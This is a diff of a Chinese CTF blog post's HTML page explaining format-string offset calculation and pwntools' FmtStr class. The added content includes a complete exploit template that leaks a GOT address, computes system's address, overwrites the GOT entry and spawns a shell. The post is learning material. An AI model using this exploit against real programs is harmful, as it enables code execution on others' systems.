@@ -29,7 +29,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%8932%E4%BD%8D%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86"><span class="toc-text">1）32位偏移计算原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%8964%E4%BD%8D%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86"><span class="toc-text">2）64位偏移计算原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89-pwntools-fmtstr%E5%B7%A5%E5%85%B7"><span class="toc-text">3） pwntools_fmtstr工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%89%E5%8F%82%E8%80%83"><span class="toc-text">）参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%8932%E4%BD%8D%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86"><span class="toc-text">1）32位偏移计算原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%8964%E4%BD%8D%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86"><span class="toc-text">2）64位偏移计算原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89-pwntools-fmtstr%E5%B7%A5%E5%85%B7"><span class="toc-text">3） pwntools_fmtstr工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E6%80%BB%E7%BB%93"><span class="toc-text">4）总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%89%E5%8F%82%E8%80%83"><span class="toc-text">5）参考</span></a></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -150,7 +150,18 @@
 
         
         
-        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/format">format</a>
+                  
+                
+            </span>
+          </span>
+         
       </div>
       <div>
       </div>
@@ -186,31 +197,58 @@ void main() {
 <h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
 <h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>
 <p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>
-<pre><code class="python">def exec_fmt(payload):
+<p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>
+<pre><code class="python">from pwn import *
+
+elf = ELF('./')
+r = process('./')
+libc = ELF('/')
+
+# 计算偏移量
+def exec_fmt(payload):
     r.sendline(payload)
     info = r.recv()
     return info
 auto = FmtStr(exec_fmt)
 offset = auto.offset
-</code></pre>
-<p>​    这是一段自动求偏移的脚本.</p>
-<pre><code class="python"> def find_offset(self):
-        marker = cyclic(20)
-        for off in range(1,1000):
-            leak = self.leak_stack(off, marker)
-            leak = pack(leak)
 
-            pad = cyclic_find(leak[:4])
-            if pad &gt;= 0 and pad &lt; 20:
-                return off, pad
-        else:
-            log.error("Could not find offset to format string on stack")
-            return None, None
+# 获得 func 的 got 地址
+func_got = elf.got['func']#func通常是一些例如printf或puts的函数
+log.success("func_got =&gt; {}".format(hex(func_got)))
+
+# 获得 func 的真实地址
+payload = p32(func_got) + '%{}$s'.format(offset)
+r.send(payload)
+func_addr = u32(r.recv()[4:8])
+log.success("func_addr =&gt; {}".format(hex(func_addr)))
+
+# 获得 system 的真实地址
+system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system'])
+log.success("system_addr =&gt; {}".format(hex(system_addr)))
+
+payload = fmtstr_payload(offset, {func_got : system_addr})
+r.send(payload)
+r.send('/bin/sh')
+r.recv()
+r.interactive()
 </code></pre>
-<p>​    这里pwntools源码中关于自动寻找偏移量的一段代码。其实还是很好理解。主要就是cyclic的应用。感觉会类似使用cyclic</p>
+<p>​    </p>
+<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>
+<p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>
+<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" data-caption="IMG_0352" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" alt="IMG_0352"></a></p>
+<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" data-caption="截屏2021-10-29 下午2.08.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" alt="截屏2021-10-29 下午2.08.21"></a></p>
+<p>​    </p>
 <p>​        </p>
-<h3 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h3><p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
+<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​    part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。</p>
+<p>​    主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。</p>
+<p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
+<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
+<h3 id="5）参考">5）参考<a class="post-anchor" href="#5）参考"></a></h3><p>​    <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>
+<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
 <p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33976344/article/details/113503914">pwntools中fmtstr的使用</a></p>
+<p>​    <a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">3.1.1 格式化字符串漏洞</a></p>
+<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/CLHugh/article/details/75000104">Python中self用法详解</a></p>
 </body></html>
 
   
